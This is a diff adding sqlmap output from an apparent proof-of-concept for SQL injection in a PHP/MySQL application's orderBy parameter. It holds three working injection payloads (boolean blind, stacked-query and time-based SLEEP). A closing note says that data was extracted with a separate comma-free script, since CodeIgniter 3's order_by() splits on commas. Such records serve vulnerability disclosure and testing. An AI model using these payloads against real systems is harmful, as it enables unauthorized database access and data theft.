@@ -1,0 +1,24 @@
+# sqlmap detection output
+# command: sqlmap -r request.txt -p orderBy
+
+Parameter: orderBy (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: orderBy=(SELECT (CASE WHEN (3536=3536) THEN 1 ELSE (SELECT 6362 UNION SELECT 6907) END))
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: orderBy=1;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: orderBy=1 AND (SELECT 7028 FROM (SELECT(SLEEP(5)))SQkK)
+
+the back-end DBMS is MySQL
+web application technology: PHP 8.5.9
+back-end DBMS: MySQL >= 5.0.12
+
+# Note: sqlmap could detect the injection but could not extract data
+# because CI3 order_by() splits the column on commas and sqlmap's
+# extraction payloads contain commas. Data extraction was done with
+# the comma-free script in poc/extract.py.
